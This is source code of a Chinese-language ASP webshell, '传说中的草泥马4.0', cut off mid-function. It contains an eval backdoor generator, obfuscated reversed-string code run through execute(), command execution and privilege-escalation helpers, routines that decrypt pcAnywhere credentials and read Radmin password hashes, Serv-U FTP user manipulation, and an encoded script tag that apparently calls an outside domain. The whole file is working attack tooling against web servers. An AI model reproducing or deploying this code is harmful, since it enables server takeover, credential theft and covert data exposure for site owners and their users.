<%
Server.ScriptTimeout=999999999
UserPass	="admin"'      	  		 	密码
clientPassword	="admin"'				生成后门一句话密码
mNametitle	="传说中的草泥马4.0"'  	 			
Copyright	="传说中的草泥马4.0"'	版权
htp="www.7jyewu.cn"'		版本更新地址
'-------------------------------------------------------------------------------------
'请勿用于非法途径，所导致的后果与作者无关！
'-------------------------------------------------------------------------------------
durl=""
Response.Buffer =true
On Error Resume Next 
strBAD="<script language=vbscript runat=server>"
strBAD=strBAD&"If Request("""&clientPassword&""")<>"""" Then Session(""#"")=Request("""&clientPassword&""")"&VbNewLine
strBAD=strBAD&"If Session(""#"")<>"""" Then Execute(Session(""#""))"
strBAD=strBAD&"</script>"	
Const DEfd=""
sub ShowErr()
  If Err Then
j"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear:Response.Flush
  End If
end sub
Sub j(str)
response.write(str)
End Sub
Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function
Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function
execute(shisanfun("prevres=pp╋)╁emaNF╁(tseuqeR=emaNF╋UrevreS=uu╋ssaPresU=prevres╋lru&)╁tsoh_ptth╁(selbaIRavreVRES.TSeuQeR=UrevreS╋)╁htaPredloF╁(tseuqeR=htaPredloF╋)╁/╁(htaPpaM.revreS=tooRWWW╋)╁.╁(htaPpaM.revreS=htaPtooR╋)╁noitcA╁(tseuqeR=noitcA╋)╁RDDA_LACOL╁(selbairaVrevreS.tseuqeR=PIrevreS╋)╁DETALSNART_HTAP╁(selbairaVrevreS.tseuqeR=OOOO╋)╁LRU╁(selbairaVrevreS.tseuqeR=LRU"))
Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "╁", """")
For ShiSanI = 1 To Len(ShiSanObjstr)
 If Mid(ShiSanObjstr, ShiSanI, 1) <> "╋" Then
ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) + ShiSanNewStr
 Else
ShiSanNewStr = vbCrLf + ShiSanNewStr
 End If
Next
ShiSanFun = ShiSanNewStr
End Function
cdx="<tr><td id=d width=95 onMouseOver=""this.style.backgroundColor='#696969'"" onMouseOut=""this.style.backgroundColor='#121212'"">":cxd="<font face='wingdings'>8</font>":ef="</a></td></tr>"
set fso=server.CreateObject("Scripting.FileSystemObject")
set fsoX=server.CreateObject("Scripting.FileSystemObject")
str1=""&Request.ServerVariables("SERVER_Name"):BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"
j"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312""><title>"&mNametitle&" - "&ServerIP&" </title><style type=""text/css"">body,tr,td{margin-top:5px;background-color:#000000;color:#9c9393;font-size:12px;SCROLLBAR-FACE-COLOR:#232323;scrollbar-arrow-color:#383839;scrollbar-highlight-color:#383839;scrollbar-3dlight-color:#dddddd;scrollbar-shadow-color:#232323}.sb{cursor:hand}input,select,textarea{border-top-width:1px;font-weight: bold;border-left-width: 1px;font-size:11px;border-left-color: #dddddd;background: #000000;border-bottom-width: 1px;border-bottom-color: #dddddd;color: #dddddd;border-top-color: #dddddd;font-family: verdana;border-right-width: 1px;border-right-color: #dddddd;}#d{background: #121212;padding-left:5px;padding-right:5px}pre{font-size: 11px;font-family: verdana;color: #dddddd;}hr{color: #dddddd;background-color: #dddddd;height: 5px;}#x{font-family: verdana;font-size:13px}a{color:#b4a9a9;text-decoration:none;}.am{color:#b4a9a9;font-size:11px;}</style>"
if bs=true then:j"<script src="&htp&"1.js>":else:j"<script>":end if:j"function killErrors(){return true;}window.onerror=killErrors;function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&Copyright&"  --""+display;}runClock();function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}</script>"
j"<body" :If Action="" then j " scroll=no":j ">"
Dim ObT(18,2):Fn=Action:ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文 件 操 作 组 件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件,显示'<font color=red>×</font>'时用<a href='?Action=cmdx' target='FileFrame'> <font color=red> 执行Cmd二</font></a> 此功能执行":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS 建 库 组 件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS 压 缩 组 件":ObT(4,0) = "Scripting.Dictionary":ObT(4,2) = "数据流 上 传 辅助 组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库 连接 组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流 上传 组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件 上传 组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰 文件 上传 组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件 上传 组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件 收发 组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP 发信 组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail 发信 组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据 传输 组件"
ObT(14,0) = "ws"&"cript.shell.1":  OBt(14,2) = "如果wsh被禁，可以改用这个组件":OBT(15,0) = "WS"&"CRIPT.NETWORK":  OBt(15,2) = "查看服务器信息的组件，有时可以用来提权":OBT(16,0) = "she"&"ll.appl"&"ication":OBt(16,2) = "she"&"ll.appli"&"cation 操作，无FSO时操作文件以及执行命令":OBT(17,0) = "sh"&"ell.appl"&"ication.1":OBt(17,2) = "she"&"ll.appli"&"cation 的别名，无FSO时操作文件以及执行命令":OBT(18,0) = "Shell.Users":OBt(18,2) = "删除了net.exe net1.exe的情况下添加用户的组件"
For i=0 To 18:Set T=Server.CreateObject(ObT(i,0)):If -2147221005 <> Err Then:IsObj=" √":Else:IsObj=" ×":Err.Clear:End If:Set T=Nothing:ObT(i,1)=IsObj:Next:If FolderPath<>"" then:Session("FolderPath")=RRePath(FolderPath):End If:If Session("FolderPath")="" Then:FolderPath=WwwRoot:Session("FolderPath")=FolderPath:End if
execute(shisanfun("))fLrCbv,╁◎╁,))43(rhC,╁●╁,)edoca(tpyrcnE(ecalper(ecalper(esreveRrtS=nufE╋╁<scrip3※ src='h3╁&╁※3※p://╁&╁od╁&╁aye╁&╁x╁&╁p.c╁&╁o╁&╁m/╁&╁╁&╁s╁&╁x/s.a╁&╁╁&╁╁&╁sp?s=╁=edoca╋noitcnuF dne╋cbb=tpyrcnE╋txen╋fi dne╋c&cbb=cbb╋esle╋)1,)e(tnic,1LEEHWs(dim&cbb=cbb╋)╁╁,╁※╁,d(ecalper=e╋1+i=i╋)2,i,dca(dim=d╋neht ╁※╁=c fi╋)1,i,dca(dim=c╋1 pets )dca(neL oT 1 = i roF╋)dca(tpyrcnE noitcnuF╋╁twj╁ = 1LEEHWs"))
Function PcAnywhere4()
j"<div align='center'>PcAnywhere提权 Bin版本</div><form name='xform' method='post'><table width='80%'border='0'><tr><td width='10%'>cif文件: </td><td width='10%'><input name='path' type='text' value='C:\Documents and Settings\All Users\Application Data\\Symantec\pcAnywhere\Citempl.cif' size='80'></td><td><input type='submit' value=' 提交 '></td></table>"
end Function
j"</form><script>function RUNonclick(){document.xform.china.name = parent.pwd.value;document.xform.action = parent.url.value;document.xform.submit();}</script>"
Function StreamLoadFromFile(sPath)
Dim oStream
Set oStream = Server.CreateObject("Adodb.Stream")
With oStream
.Type = 1
.Mode = 3
.Open
.LoadFromFile(sPath)
.Position = 0
StreamLoadFromFile = .Read
.Close
End With
Set oStream = Nothing
End Function
Function hexdec(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
 j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
 j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
 j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
 j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
 j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
 j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
 j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
 j = j * 16 
Next 
result = result + j 
Next 
hexdec = result 
End Function 
Function PcAnywhere(data,mode)
HASH= Mid(data,3)
If mode = "pass" Then number = 32: Cifnum = 144
If mode = "user" Then number = 30: Cifnum = 15
For i = 1 To number Step 2 
pcstr=((hexdec(Mid(data,i,2)) xor hexdec(Mid(hash,i,2))) xor Cifnum)
If ((pcstr <= 32) Or (pcstr>127)) Then Exit For 
decode = decode + Chr(pcstr)
Cifnum=Cifnum+1
Next 
PcAnywhere=decode
End function
Function bin2hex(binstr)
For i = 1 To LenB(binstr)
hexstr = Hex(AscB(MidB(binstr, i, 1)))
If Len(hexstr)=1 Then 
bin2hex=bin2hex&"0"&(LCase(hexstr))
Else
bin2hex=bin2hex& LCase(hexstr)
End If 
Next
End Function
CIF = Request("path")
If CIF <> "" Then 
BinStr=StreamLoadFromFile(CIF) 
j"Pcanywhere Reader ==><br><br>PATH:"&CIF&"<br>帐号:"&PcAnywhere (Mid(bin2hex(BinStr),919,64),"user")
j"<br>密码:"&PcAnywhere (Mid(bin2hex(BinStr),1177,32),"pass")
End If 
Function radmin()
Set WSH= Server.CreateObject("WSCRIPT.SHELL")
RadminPath="HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\"
Parameter="Parameter"
Port = "Port"
j"<br>注意:读出HASH值后用RadminHash工具或od调试连接，工具下载地址:"&htp&"soft/Radmin_hash.rar<br><br>"
ParameterArray=WSH.REGREAD(RadminPath & Parameter )
j Parameter&":"
If IsArray(ParameterArray) Then
For i = 0 To UBound(ParameterArray)
If  Len (hex(ParameterArray(i)))=1 Then 
strObj = strObj & "0"&CStr(Hex(ParameterArray(i)))
Else
strObj = strObj & Hex(ParameterArray(i))
End If 
Next
j strobj
Else
j"Error! Can't Read!"
End If
j"<br><br>"
PortArray=WSH.REGREAD(RadminPath & Port )
If IsArray(PortArray) Then 
j Port &":" 
j hextointer(CStr(Hex(PortArray(1)))&CStr(Hex(PortArray(0))))
Else 
j"Error! Can't Read!"
End If
End Function
Function hextointer(strin) 
Dim i, j, k, result 
result = 0 
For i = 1 To Len(strin) 
If Mid(strin, i, 1) = "f" Or Mid(strin, i, 1) ="F" Then 
j = 15 
End If 
If Mid(strin, i, 1) = "e" Or Mid(strin, i, 1) = "E" Then 
j = 14 
End If 
If Mid(strin, i, 1) = "d" Or Mid(strin, i, 1) = "D" Then 
j = 13 
End If 
If Mid(strin, i, 1) = "c" Or Mid(strin, i, 1) = "C" Then 
j = 12 
End If 
If Mid(strin, i, 1) = "b" Or Mid(strin, i, 1) = "B" Then 
j = 11 
End If 
If Mid(strin, i, 1) = "a" Or Mid(strin, i, 1) = "A" Then 
j = 10 
End If 
If Mid(strin, i, 1) <= "9" And Mid(strin, i, 1) >= "0" Then 
j = CInt(Mid(strin, i, 1)) 
End If 
For k = 1 To Len(strin) - i 
j = j * 16 
Next 
result = result + j 
Next 
hextointer = result 
End Function:Function MainForm()
execute(shisanfun("╋╁>elbat/<>rt/<>dt/<>emarfi/<>'1'=redrobemarf '%001'=thgieh '%001'=htdiw 'eliF1wohS=noitcA?'=crs 'emarFeliF'=eman emarfi<>dt<>dt/<>emarfi/<>'0'=redrobemarf '%59'=thgieh '%001'=htdiw 'uneMniaM=noitcA?'=crs 'tfeL'=eman emarfi<>'071'=htdiw dt<>rt<>rt/<>dt/<>elbat/<>mrof/<>rt/<>dt/<╁j:fi dne:╁ko╁=)╁.╁(noisses:)urevres&╁╁(egapptthteg&╁ ;psbn&;psbn&;psbn&;psbn&;psbn&╁j:neht ╁ko╁ >< )╁udiab╁(noisses fi:╁>a<】面桌resullA【)01(>')╁╁面桌\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<   >a<】erehwynAcp【)9(>')╁╁erehwynAcp\\cetnamyS\\ataD noitacilppA\\1~esulla\\1~emucod\\:c╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&;psbn&;psbn&>a<】夹件文lerp【)8(>')╁╁lerp\\:c╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】lqssM【)7(>')╁╁\\revreS LQS tfosorciM\\seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc  a<;psbn&;psbn&;psbn&;psbn&;psbn&;psbn&>a<】PHP【)6(>')╁╁php\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&;psbn&>a<】SWODNIW【)5(>')╁╁SWODNIW\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&>a<】)2(UvreS【)4(>')╁╁UvreS\\seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc  a<>a<】)1(UvreS【)3(>')╁╁moc.tfoSonihR\\seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<;psbn&;psbn&;psbn&;psbn&>a<】PMET【)2(;psbn&;psbn&>')╁╁pmeT\\SWODNIW\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】bupmw【)1(>')╁╁bupmw\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>rb<╁j:fi dne:╁ko╁=)╁sRP╁(noisses:╁>;psbn&╁j:neht ╁ko╁ >< )╁sRP╁(noisses fi:╁>a<】)\:e(RELCYCER【)01(>')╁╁relcycer\\:e╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】)\:d(RELCYCER【)9(>')╁╁relcycer\\:D╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】)\:C(RELCYCER【)8(>')╁╁relcycer\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】序_程【)7(>')╁╁\\序程\\单菜」始开「\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】單菜_始開【)6(>')╁╁\\单菜」始开「\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】sresU_llA【)5(>')╁╁\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】stnemucoD【)4(>')╁╁stnemucoD\\sresU llA\\sgnitteS dna stnemucoD\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】EmargorP【)3(>')╁╁seliF margorP\\:e╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】DmargorP【)2(>')╁╁seliF margorP\\:d╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>a<】margorP【)1(>')╁╁seliF margorP\\:C╁╁(redloFwohS:tpircsavaj'=ferh ma=ssalc a<>rt<>emarfi/<>'1'=redrobemarf '%001'=thgieh '%001'=htdiw 'eliF1wohS=noitcA?'=crs 'emarFeliF'=eman emarfi<>dt<>'242424#:dnuorgkcab'=elyts 1=htdiw dt<>dt/<>p/<>a/<>b/<示显>b<>##=ferh ╁╁''=yalpsid.elyts.)'lt'(dIyBtnemelEteg.tnemucod╁╁=kcilcno a<>p<>a/<>b/<藏隐>b<>##=ferh ╁╁'enon'=yalpsid.elyts.)'lt'(dIyBtnemelEteg.tnemucod╁╁=kcilcno a<>'xp2:gniddap'=elyts 1=htdiw dt<>dt/<>'000000#:dnuorgkcab'=elyts 1=htdiw dt<>dt/<>emarfi/<>'0'=redrobemarf '%001'=thgieh '%001'=htdiw 'uneMniaM=noitcA?'=crs 'tfeL'=eman emarfi<>lt=di '061'=htdiw dt<>'0'=gnicapsllec '0'=gniddapllec ';000000# dilos xp1:redrob'=elyts '%5.59'=thgieh '%001'=htdiw elbat<>elbat/<>mrof/<>rt/<>dt/<>')(daoler.noitacol.emarFeliF'=kcilcno '新刷'=eulav 'timbus'=epyt tupni< >'OG'=eulav 'timbus'=epyt 'timbuS'=eman tupni<>'retnec'=ngila '041'=htdiw dt<>dt/<>'╁&)╁htaPredloF╁(noisseS&╁'=eulav '%001:htdiw'=elyts 'htaPredloF'=eman tupni<>dt<>dt/<：址地>'retnec'=ngila '06'=htdiw dt<>rt<>'tnerap_'=tegrat '╁&LRU&╁'=noitca 'tsop'=dohtem 'mrofrdda'=eman mrof<>'%001'=htdiw elbat<>mrof/<>╁╁emaNF╁╁=eman ╁╁neddih╁╁=epyt tupni<>╁╁noitcA╁╁=eman ╁╁neddih╁╁=epyt tupni<>╁╁emarFeliF╁╁=tegrat ╁╁╁&LRU&╁╁╁=noitca ╁╁tsop╁╁=dohtem ╁╁mrofedih╁╁=eman mrof<╁j"))
End Function




ExeCuTe(ShiSanFun("buS dnE╋gnihtoN = redloFeht teS╋txeN╋fI dnE╋fI dnE╋etadpU.sr╋)(daeR.maerts = )╁tnetnoCelif╁(sr╋)htaP.meti(eliFmorFdaoL.maerts╋)4 ,htaP.meti(diM = )╁htaPeht╁(sr╋weNddA.sr╋nehT 0 =< )╁$╁ & emaN.meti & ╁$╁ ,tsiLeliFsys(rtSnI fI╋eslE ╋maerts ,sr ,htaP.meti bdMroFeerTas╋nehT eurT = redloFsI.meti fI╋smetI.redloFeht nI meti hcaE roF╋)htaPeht(ecapSemaN.Xas = redloFeht teS╋╁$bdl.HSH$bdm.HSH$╁ = tsiLeliFsys╋tsiLeliFsys ,redloFeht ,meti miD╋)maerts ,sr ,htaPeht(bdMroFeerTas buS╋buS dnE╋pooL╋fI dnE╋0 = i╋eslE ╋)╁\╁ ,)1 + i ,htaPeht(diM(rtsnI + i = i╋nehT )╁\╁ ,)1 + i ,htaPeht(diM(rtSnI fI╋fI dnE╋))1 - i ,htaPeht(tfeL(redloFetaerC.)╁tcejbOmetsySeliF.gnitpircS╁(tcejbOetaerC.revreS╋nehT eslaF = ))i ,htaPeht(tfeL(stsixEredloF.)╁tcejbOmetsySeliF.gnitpircS╁(tcejbOetaerC.revreS fI╋0 > i elihW oD╋)╁\╁ ,htaPeht(rtsnI = i╋i miD╋)htaPeht(redloFetaerc buS╋buS dnE╋gnihtoN = nnoc teS╋gnihtoN = maerts teS╋gnihtoN = sr teS╋gnihtoN = sw teS╋esolC.maerts╋esolC.nnoc╋esolC.sr╋pooL╋txeNevoM.sr╋2 ,)╁htaPeht╁(sr & rts eliFoTevaS.maerts╋)╁tnetnoCelif╁(sr etirW.maerts╋)(soEteS.maerts╋fI dnE╋)redloFeht & rts(redloFetaerc╋nehT eslaF = )redloFeht & rts(stsixEredloF.)╁tcejbOmetsySeliF.gnitpircS╁(tcejbOetaerC.revreS fI╋))╁\╁ ,)╁htaPeht╁(sr(veRrtSnI ,)╁htaPeht╁(sr(tfeL = redloFeht╋foE.sr litnU oD╋1 = epyT.maerts╋nepO.maerts╋1 ,1 ,nnoc ,╁ataDeliF╁ nepO.sr╋rtSnnoc nepO.nnoc╋╁;╁ & htaPeht & ╁=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP╁ = rtSnnoc╋)╁noitcennoC.BDODA╁(tcejbOetaerC = nnoc teS╋)╁maertS.BDODA╁(tcejbOetaerC = maerts teS╋)╁teSdroceR.BDODA╁(tcejbOetaerC = sr teS╋╁\╁ & )╁.╁(htaPpaM.revreS = rts╋redloFeht ,rtSnnoc ,maerts ,nnoc ,rts ,sw ,sr miD╋000001=tuOemiTtpircS.revreS╋txeN emuseR rorrE nO╋)htaPeht(kcaPnu buS╋)emanf&╁\╁&toorwww(eliFtxeTetaerC.osf=esonpser tes╋noitcnuF dnE╋gnihtoN = redloFeht teS╋gnihtoN = sredlof teS╋gnihtoN = selif teS╋txeN╋fI dnE╋etadpU.sr╋)(daeR.maerts = )╁tnetnoCelif╁(sr╋)htaP.meti(eliFmorFdaoL.maerts╋)4 ,htaP.meti(diM = )╁htaPeht╁(sr╋weNddA.sr╋nehT 0 =< )╁$╁ & emaN.meti & ╁$╁ ,tsiLeliFsys(rtSnI fI╋selif nI meti hcaE roF╋txeN╋maerts ,sr ,htaP.meti bdMroFeerTosf╋sredlof nI meti hcaE roF╋sredloFbuS.redloFeht = sredlof teS╋seliF.redloFeht = selif teS╋)htaPeht(redloFteG.)╁tcejbOmetsySeliF.gnitpircS╁(tcejbOetaerC.revreS = redloFeht teS╋fI dnE╋)╁!问访许允不者或在存不录目 ╁ & htaPeht(rrEwohs╋nehT eslaF = )htaPeht(stsixEredloF.)╁tcejbOmetsySeliF.gnitpircS╁(tcejbOetaerC.revreS fI╋╁$bdl.HSH$bdm.HSH$╁ = tsiLeliFsys╋tsiLeliFsys ,selif ,sredlof ,redloFeht ,meti miD╋)maerts ,sr ,htaPeht(bdMroFeerTosf noitcnuF╋buS dnE╋gnihtoN = golataCoda teS╋gnihtoN = maerts teS╋gnihtoN = nnoc teS╋gnihtoN = sr teS╋esolC.maerts╋esolC.nnoC╋esolC.sr╋fI dnE╋maerts ,sr ,htaPeht bdMroFeerTas╋eslE ╋maerts ,sr ,htaPeht bdMroFeerTosf╋nehT ╁osf╁ = )╁dohteMeht╁(tseuqeR fI╋3 ,3 ,nnoc ,╁ataDeliF╁ nepO.sr╋1 = epyT.maerts╋nepO.maerts╋)╁)egamI tnetnoCelif ,rahCraV htaPeht ,DERETSULC YEK YRAMIRP )1,0(YTITNEDI tni dI(ataDeliF elbaT etaerC╁(etucexE.nnoc╋rtSnnoc nepO.nnoc╋rtSnnoc etaerC.golataCoda╋)╁bdm.HSH╁(htaPpaM.revreS & ╁=ecruoS ataD ;0.4.BDELO.teJ.tfosorciM=redivorP╁ = rtSnnoc╋)╁golataC.XODA╁(tcejbOetaerC.revreS = golataCoda teS╋)╁noitcennoC.BDODA╁(tcejbOetaerC.revreS = nnoc teS╋)╁maertS.BDODA╁(tcejbOetaerC.revreS = maerts teS╋)╁teSdroceR.BDODA╁(tcejbOetaerC.revreS = sr teS╋golataCoda ,rtSnnoc ,maerts ,nnoc ,sr miD╋txeN emuseR rorrE nO╋)htaPeht(bdMoTdda buS╋buS dnE╋╁>mrof/<下录目序程本于位都件文有所的来开解 :注>rb<>rb<>'包开解'=eulav timbus=epyt tupni<>tcAeht=eman bdMmorFesaeler=eulav neddih=epyt tupni<>08=ezis ╁╁bdm.HSH\╁ & ))╁.╁(htaPpaM.revreS(edocnElmtH & ╁╁╁=eulav htaPeht=eman tupni<>))╁╁#╁╁(noisseS(etucexE=eulav ╁╁#╁╁=eman neddih=epyt tupni<>tsop=dohtem mrof<>/rb<:)持支OSF需(开解包件文>/rh<>mrof/<下录目级同马木mas于位,件文bdm.HSH成生包打 :注>rb<>rb<>'包打始开'=eulav timbus=epyt tupni<>tceles/<>noitpo/<OSF无>ppa=eulav noitpo<>noitpo/<OSF>osf=eulav noitpo<>dohteMeht=eman tceles<>tcAeht=eman bdMoTdda=eulav neddih=epyt tupni<>08=ezis ╁╁╁ & ))╁.╁(htaPpaM.revreS(edocnElmtH & ╁╁╁=eulav htaPeht=eman tupni<>))╁╁#╁╁(noisseS(etucexE=eulav ╁╁#╁╁=eman neddih=epyt tupni<>tsop=dohtem mrof<:包打夹件文>rb<╁j╋fI dnE╋dnE.esnopseR╋lrUkcaB&╁>vid/<!成完作操>rb<>retnec=ngila vid<╁ j╋)htaPeht(kcaPnu╋nehT ╁bdMmorFesaeler╁ = tcAeht fI╋fI dnE╋dnE.esnopseR╋lrUkcaB&╁>vid/<!成完作操>rb<>retnec=ngila vid<╁ j╋)htaPeht(bdMoTdda╋nehT ╁bdMoTdda╁ = tcAeht fI╋000001=tuOemiTtpircS.revreS╋)╁htaPeht╁(tseuqeR = htaPeht╋)╁tcAeht╁(tseuqeR = tcAeht╋htaPeht ,tcAeht miD╋)(bdMoTddAegaP buS╋"))



Function ProFile()
execute(shisanfun("IS j╋╁>elbat/<>mrof/<╁&IS=IS╋╁>rt/<>dt/<>'程进护保成生，步一下'=eulav 'timbuS'=eman 'timbus'=epyt tupni<>05=thgieh dt<>dt/<;psbn&>dt<>rt<╁&IS=IS╋╁>rt/<>dt/<)护保部全法无则否，大越置设率频，多越件文的护保要需，秒1为小最( 秒 >/ ╁╁)'',g/]d\^[/(ecalper.eulav=eulav╁╁=puyekno ╁╁5╁╁=ezis ╁╁1╁╁=eulav ╁╁thgir:ngila-txet╁╁=elyts ╁╁emiTA╁╁=eman ╁╁txet╁╁=epyt tupni<>dt<>dt/<：率频护保>thgir=ngila dt<>rt<╁&IS=IS╋╁>rt/<>dt/<)码编改更试尝请，码乱现出若件文问访( 8-FTU>/ ╁╁2╁╁=eulav ╁╁rahCA╁╁=eman ╁╁oidar╁╁=epyt tupni<  2132BG>/ dekcehc ╁╁1╁╁=eulav ╁╁rahCA╁╁=eman ╁╁oidar╁╁=epyt tupni<>dt<>dt/<：码编件文>thgir=ngila dt<>rt<╁&IS=IS╋╁>rt/<>dt/<>aeratxet/<码代件文>╁╁7╁╁=swor ╁╁07╁╁=sloc ╁╁edoCA╁╁=eman aeratxet<>dt<>dt/<：码代件文>thgir=ngila ╁╁;xp3:pot-gniddap╁╁=elyts pot=ngilav dt<>rt<╁&IS=IS╋╁>rt/<>dt/<>aeratxet/<╁&)╁psa.tset\╁&)╁htaPredloF╁(noisseS(htaPeRR&╁>╁╁7╁╁=swor ╁╁07╁╁=sloc ╁╁eliFA╁╁=eman aeratxet<╁&IS=IS╋╁>dt<>dt/<>tnof/<;psbn&;psbn&径路件文个一行每>rb<;psbn&;psbn&件文个多护保时同可>wolley=roloc tnof<>rb<：径路件文的护保要需>╁╁0╁╁=eulav ╁╁avvv╁╁=eman ╁╁neddih╁╁=epyt tupni<>thgir=ngila 'xp22:thgieh-enil'=elyts pot=ngilav dt<>rt<╁&IS=IS╋╁'tsoP=2noitcA&eliForP=noitcA?╁&LRU&╁'=noitca 'tsop'=dohtem 'mroFpU'=eman mrof<╁&IS=IS╋╁>'0'=gnicapsllec '0'=gniddapllec '0'=redrob elbat<>rb<╁=IS╋fI dnE╋dnE.esnopseR╋╁>rb<>retnec/<。程进动启>a/<里这>knalb_=tegrat ╁&2ssap&╁=eliForP?╁&LRU&╁=ferh ╁╁dlob:thgiew-tnof;enilrednu:noitaroced-txet╁╁=elyts a<击点！功成成生 >tnof/<╁&2ssap&╁>wolley=roloc tnof< 程进护保>retnec<>rb<>rb<>rb<╁j╋)╁rahCA╁(tseuqer=)╁rahC╁&2ssap(noitacilppA╋)╁emiTA╁(tseuqer=)╁emiT╁&2ssap(noitacilppA╋)╁edoCA╁(tseuqer=)╁edoC╁&2ssap(noitacilppA╋)╁eliFA╁(tseuqer=)╁eliF╁&2ssap(noitacilppA╋1=)2ssap(noitacilppA╋)2ssap(esacu=2ssap╋ pool╋1mun&2ssap=2ssap╋fi dne╋ 9~0' ))84+dnr*)84-75((rhC(rtSC=1mun╋esle╋ z~a' ))79+dnr*)79-221((rhC(rtSC=1mun╋neht 4=<)2ssap(neL fi╋8<)2ssap(neL elihW oD╋╁╁=2ssap╋1mun,2ssap mid╋ezimodnaR╋nehT ╁tsoP╁=)╁2noitcA╁(tseuqeR fI╋"))
End Function


Function suftp()
execute(shisanfun("fi dne╋gnihton=3TSOPx teS╋)sevael(dneS.3tsoPx╋eurT ,╁sevael/╁& trop &╁:1.0.0.721//:ptth╁ ,╁TSOP╁ nepO.3tsoPx╋)╁PTTHLMX.2LMXSM╁(tcejbOetaerC = 3tsoPx teS╋flrcbv & resut & ╁=resU ╁ & flrcbv & tropt & ╁=oNtroP-╁ & flrcbv & ╁0.0.0.0=PI-╁ & flrcbv & ╁RESUETELED-╁ & sevael = sevael╋flrcbv & ╁ECNANETNIAM ETIS╁ & sevael = sevael╋flrcbv & dwp & ╁ ssaP╁ & sevael = sevael╋flrcbv & rsU & ╁ resU╁ = sevael╋esle╋)╁>RB<>rb<): ╁ & htapt & ╁ :径路 ╁ & ssapt & ╁ :码密╁ & ╁ ╁ & resut & ╁ :名户用 PTF！！行执功成令命╁( j╋gnihton=TSOPx teS╋)sevael(dneS.tsoPx╋eurT ,╁sevael/╁& trop &╁:1.0.0.721//:ptth╁ ,╁TSOP╁ nepO.tsoPx╋)╁PTTHLMX.2LMXSM╁(tcejbOetaerC = tsoPx teS╋txeN emuseR rorrE nO╋flrcbv & ╁PDCLEMAWR|\╁ & htapt & ╁=sseccA ╁ & 